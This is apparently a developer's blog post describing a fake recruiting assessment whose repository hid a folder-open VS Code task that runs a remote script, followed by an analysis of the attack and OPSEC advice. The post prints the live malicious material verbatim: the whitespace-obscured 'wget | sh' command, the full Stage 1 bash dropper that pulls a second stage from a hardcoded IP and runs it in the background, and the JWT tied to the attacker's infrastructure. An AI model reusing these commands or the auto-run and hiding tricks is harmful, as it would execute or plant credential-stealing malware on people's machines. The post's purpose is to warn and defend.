+++
title = "The Fake Interview Trap: How I Stopped Hackers from Deploying a Zero-Click Exploit"
description = "How a technical interview turned into a live malware analysis and cyber defense. Read my breakdown of a sophisticated exploit designed to steal developer secrets."
date = 2026-04-29
draft = false

[taxonomies]
tags = ["social-engineering", "malware", "cyberattack"]
+++

## Introduction

The tech job market is undeniably brutal right now. Layoffs, ghosting, and hyper-competitive interview loops have created an environment where developers are eager to prove their skills and land an offer. Threat actors know this, and they have weaponized the technical interview process.

Recently, what started as a standard outreach message from an "HR recruiter" for a backend engineering role quickly devolved into one of the most sophisticated cyberattacks I’ve ever personally encountered. It wasn't a phishing link or a fake login page. It was a highly targeted, multi-stage malware deployment mechanism disguised as a take-home coding challenge.

**The TL;DR**: I was given a "Git merge assessment" that was actually a Trojan horse. It was designed to execute a zero-click remote code payload on my machine, completely bypassing the terminal, simply by opening the project in a code editor.

Because I noticed a few bizarre inconsistencies in their instructions, I decided to sandbox the assessment in an air-gapped Debian virtual machine. That decision saved my personal credentials, my AWS keys, and my machine. Here is the full technical breakdown of how the trap was set, the red flags you need to look out for, and how I reverse-engineered their bash dropper.

## Social Engineering & Red Flags

Every good cyberattack starts with social engineering. The initial hook needs to be plausible enough to lower your guard, but urgent enough to make you skip your standard security protocols.

**The "Opportunity"**
The attack began with a direct message from a recruiter claiming to represent a company called "Trust-AI". After a brief chat about my background, they outlined their interview process. Before moving on to the standard system design and backend architecture rounds, they required me to pass a "leadership workflow" test.

Their scenario: *“You're in charge of the main branch, and the members are off doing their thing on a new branch. You've gotta rebase or merge the new branch's progress into main, ironing out those Git wrinkles along the way.”*

They invited me to a private GitHub repository and provided a formal, one-page PDF outlining the assessment. I had exactly one hour to complete it.

**The Red Flags**
Almost immediately, the framing felt entirely wrong.

  1. The "Leadership" Label: The recruiter repeatedly framed resolving a branch conflict as a test of "leadership." Managing a branch is basic work. If a company legitimately views a basic git rebase as high-level leadership, their engineering culture is profoundly broken.
  2. The Urgent "UI Verification": The instruction document explicitly told me to "verify the project appearance matches the provided screenshot" and to "troubleshoot a bug." Why would I need to run a local build and spin up a development server just to verify the authorship of a Git conflict?

## The Editor Conflict

The biggest red flag was a rigid constraint in their instructions: **I was strictly mandated to open the project using VS Code**. I am a terminal-native developer. My daily driver is **Helix**, a modal, terminal-based text editor. I handle all my version control, file editing, and conflict resolution directly from the command line.

In a legitimate technical assessment, a company cares about the output - a clean Git tree, functional code, and a solid PR. They do not care which text editor you use to get there. The fact that the instructions specifically required me to use VS Code meant that the editor itself was an integral part of the assessment.

## The Defensive Setup

Because of the forced VS Code requirement and the suspicious push to "verify the UI" for a basic Git assessment, my guard was fully up. There was absolutely no way I was going to clone a closed-source, unverified repository directly onto my daily-driver host machine.

Instead, I implemented a strict zero-trust approach.

I spun up a fresh, isolated Debian virtual machine dedicated exclusively to this single task. If the repository contained malicious build scripts or exploit chains, the blast radius would be confined to a disposable container with no access to my local files, SSH keys, or network shares.

There was a catch: the repository was private. To clone it, I had to authenticate with my real GitHub account. If I copied my primary SSH key into the VM, and the VM was compromised, the attackers would gain full access to every repository I contribute to.

To mitigate this, I utilized GitHub's Fine-grained Personal Access Tokens. I generated a temporary token scoped exclusively to their private repository with the bare minimum read/write permissions required to clone and push. Even if the attackers stole this token, it would be entirely useless outside of their own repository.

With the VM secured and the scoped token in hand, I cloned the project and opened it.

## Auditing the Workspace

After successfully cloning the repository into my isolated VM, I made a critical decision: I completely ignored their strict mandate to use VS Code.

Instead, I opened the project directory using my favourite editor Helix.

By sticking to my terminal-native workflow, I inadvertently neutralized their entire attack vector before it even began. Helix is a lightning-fast, modal text editor. It doesn't automatically parse, trust, or execute workspace configuration files like `.vscode` or `.idea`. It just reads text.

But my curiosity was heavily piqued. Why was the recruiter so desperate for me to use VS Code? To find out, I navigated straight to the hidden `.vscode` directory and opened the `tasks.json` file in Helix to see what they were trying to force me to run.

**The Distraction**
At first glance, the `tasks.json` file looked incredibly professional. It was filled with hundreds of lines of complex JSON detailing a web3/blockchain "StakingGame" application.

It included fabricated configuration blocks like `environmentProfiles`, `metaDiagnostics`, and `executionPolicies`. It listed `preRunChecks` requiring specific Node.js versions and Hardhat configurations.

This was pure psychological manipulation. The attacker packed the file with advanced-sounding jargon to overwhelm the target, making them think they were looking at a complex, enterprise-grade deployment script so they would stop reading and just get to work on the Git conflict.

**The Trigger**
But as I scrolled past the wall of fake blockchain configurations down to the actual executable `tasks` array, the true intent of the repository was sitting right there:

> `.vscode/tasks.json`
```json
"runOptions": {
  "runOn": "folderOpen"
}
```
This was the smoking gun.

By defining `"runOn": "folderOpen"`, the attacker engineered a zero-click exploit trap. If I had followed the recruiter's instructions, opened the project in VS Code, and clicked "Yes, I trust the authors" on the initial Workspace Trust prompt, VS Code would have immediately executed the hidden payload in the background.

I wouldn't have had to open a terminal. I wouldn't have had to run `npm install`. The mere act of opening the editor was the detonator.

## The Payload: Capturing the Stage 1 Dropper

I found the trigger. I looked at the specific execution commands mapped to the OS profiles in the JSON file. At first glance, the commands for Linux, Windows, and Mac looked completely empty.

I realized it was a classic obfuscation trick. They used a massive amount of horizontal whitespace. If you didn't have word wrap enabled in your editor, the command was pushed so far to the right that it was completely hidden off-screen.

At the very end of the line, I found this dropper command for Linux:
> `.vscode/tasks.json`
```json
"linux": {
  "command":                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         "wget -qO- 'https://gurucooldown.short.gy/gxUsMe8l' -L | sh"
}
```
> (you have to scroll horizontally to the right)

This is incredibly nasty. It silently downloads a file from a shortened URL and pipes it directly into the system shell. If I had used VS Code and trusted the workspace, this would have run instantly with my user permissions.

I wanted to see what that script actually did. Since I was safe inside my Debian VM, I manually downloaded it. Instead of letting it pipe to `sh`, I forced it to save as a harmless text file by running: 

`wget -qO payload.txt 'https://gurucooldown.short.gy/gxUsMe8l'`

I opened the text file, and here is the exact bash script they were trying to run on my machine:

```bash
#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://165.140.86.190:3000/task/tokenlinux?token=40abc18736c9&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6Ijo6ZmZmZjoxNTIuNTkuMTY3LjM4Iiwic2Vzc2lvbklkIjoiMzk1NjU5MTQtYzg3Zi00ZGUwLWE1MTUtNmQwMmJjYjYyOWY2Iiwic3RlcCI6MSwidGltZXN0YW1wIjoxNzc3NDU4ODUwNDgzLCJvcmlnVG9rZW4iOiI0MGFiYzE4NzM2YzkiLCJpYXQiOjE3Nzc0NTg4NTAsImV4cCI6MTc3NzQ1OTAzMH0.-TgaACMUSDLG67sxnGOUzUvLpUJIJaVZxJHMxRxjRMs"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
$//' "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
```

## Deconstructing the Malware

It is a textbook Stage 1 dropper. Its only job is to be tiny, fetch the real malware from a remote server, execute it, and cover its tracks.

First, it uses `set -e` to make sure the script exits immediately if any command fails. This prevents it from throwing obvious error messages on the screen that might make a developer suspicious. It also prints "Authenticated" right at the start. That is a psychological trick. If you happened to see your terminal flash for a second, you would just assume a normal Git login process had just finished.

Then there are the `clear` commands. The attacker placed a `clear` between almost every single line of code. This is a crude but highly effective way to keep the terminal totally blank while the script works in the background.

Next, it downloads the Stage 2 payload from a hardcoded IP address (165.140.86.190) directly into my Documents folder. Notice how it saves the file as `tokenlinux.npl` first, and then renames it to `tokenlinux.sh`. The `.npl` extension is totally fake. Attackers do this to sneak the payload past basic network firewalls or antivirus software that automatically flag and block `.sh` file downloads.

Finally, we get to the actual execution phase. It uses `nohup bash` combined with the `&` operator at the very end. This completely detaches the malware from the terminal session. Even if you close your editor or kill the visible terminal window, the script just keeps running in the background. It also pipes all output to `/dev/null 2>&1`, throwing any logs or system errors into a black hole so you never see them.

## The Sophistication

The bash script itself was clever, but the real infrastructure was exposed in the download URL.

Look closely at the link they used to fetch the Stage 2 payload:
`http://165.140.86.190:3000/task/tokenlinux?token=...&st=eyJhbG...`

That massive string of random looking characters at the end is a JSON Web Token. I decided to run it through a base64 decoder to see what kind of data the attacker was passing to their server.

Here is what the decoded payload looked like:
```json
{
  "ip": "::ffff:152.59.167.38",
  "sessionId": "39565914-c87f-4de0-a515-6d02bcb629f6",
  "step": 1,
  "timestamp": 1777458850483,
  "origToken": "40abc18736c9",
  "iat": 1777458850,
  "exp": 1777459030
}
```

This revealed exactly how their malware infrastructure operates. They built a system designed to lock the payload to a specific IP address and set an expiration timer. The `exp` value is a Unix timestamp that translates to April 29, 2026.

This is a highly advanced anti-analysis technique. Attackers do this so that if a security researcher gets their hands on the script later and tries to download the malware to study it, the server will reject the request because the token is expired or the IP does not match.

But here is where their own sophistication completely broke their attack chain.

I work from home on a standard Wi-Fi broadband connection. However, before I even started analyzing this sketchy repository, I turned on a simple VPN service. I did not want to expose my real home IP address to a potentially malicious command and control server.

When I looked at the IP address hardcoded into the attacker's token, I realized it was completely different from the IP address my VPN was currently broadcasting.

This meant their over engineered trap actually saved me. Even if I had made a mistake and accidentally executed that Stage 1 dropper, the final malware never would have reached my machine. The attacker's command and control server would have seen my incoming VPN connection, realized it did not match the IP address they baked into their token, and immediately blocked the download with a 403 Forbidden error.

They built a complex system to keep security researchers out, but a basic, everyday VPN habit was enough to completely break their malware deployment.

## What Were They Actually After?

This was not some random kid playing a prank. This was a highly organized and automated cyberattack. But why go through all this effort to trick a developer into running a script?

Because developers are incredibly high value targets.

If I had let the Stage 1 dropper finish its job, it would have downloaded and executed `tokenlinux.sh`. This Stage 2 file is known in the cybersecurity world as an Info-Stealer.

Unlike ransomware that loudly encrypts your hard drive and demands money, an Info-Stealer is designed to be completely silent. Its only goal is to quickly recursively search your local directories for high value secrets, zip them up, and upload them to the attacker's server.

They are looking for very specific things. They want your `~/.ssh/` directory so they can steal your private keys and access your GitHub or production servers. They want your `~/.aws/credentials` file so they can spin up crypto mining rigs on your company's dime. They are hunting for local `.env` files that might contain expensive AI platform API keys. They also target your browser's hidden data folders to scrape your session cookies, allowing them to bypass two-factor authentication on your web accounts. And of course, they look for local cryptocurrency wallet files.

## The Decision to Dig Deeper

At this point, I had the Stage 1 dropper and the URL for the Stage 2 payload in my hands. My initial instinct was to walk away. 
I am a software engineer, not a cybersecurity expert or a malware analyst. So I initially stopped my at the first stage. 

But the puzzle was too compelling to ignore for me. So in the next day, I decided to deep dive.

I documented the complete technical teardown in a dedicated follow-up post: 
[Down the Rabbit Hole: Reverse Engineering a Multi-Stage Malware Attack](https://roynrishingha.com/blog/reverse-engineering-multi-stage-malware/)

## Conclusion & Developer OPSEC

It is incredibly frustrating to invest time and emotional energy into a job prospect, only to realize you are actively being hunted by cybercriminals. The job search is stressful enough without having to reverse engineer the technical assessments they send you.

But this is the new reality. Threat actors are no longer just looking for unpatched servers in production. They are actively targeting the developers who build those servers, because our local machines hold the ultimate keys: SSH keys, database credentials, and cloud architecture access.

If there is one thing you take away from my experience, let it be this strict set of Operational Security (OPSEC) rules for your next technical interview:

1. Zero Trust for Take Home Tests
Never, ever clone an unverified repository directly onto your daily driver machine. If a company wants you to run their code, spin up an isolated environment. Use a disposable virtual machine, a Docker container, or a cloud based environment. Keep your host machine clean.

2. Audit Before You Trust
If you do use VS Code, pay close attention to that Workspace Trust prompt. Do not blindly click "Yes". Take two minutes to open the project in Restricted Mode or a terminal editor like I did with Helix. Audit the hidden .vscode/tasks.json file, check the package.json for malicious post install scripts, and look for anything that executes automatically.

3. Scope Your Credentials
If a technical assessment requires you to authenticate with your real GitHub account, never use your primary, sweeping Personal Access Token. Take the thirty seconds to generate a Fine-grained token scoped strictly to that single repository. Once the assessment is over, revoke it immediately.

4. Trust Your Gut
If the HR process feels disjointed, if the technical requirements make no sense for the role being tested, or if they rigidly force you to use specific tools to "verify" things that do not need verifying, stop. It is better to walk away from a weird interview than to spend weeks recovering your stolen digital identity.

**Stay paranoid out there, and happy coding.**
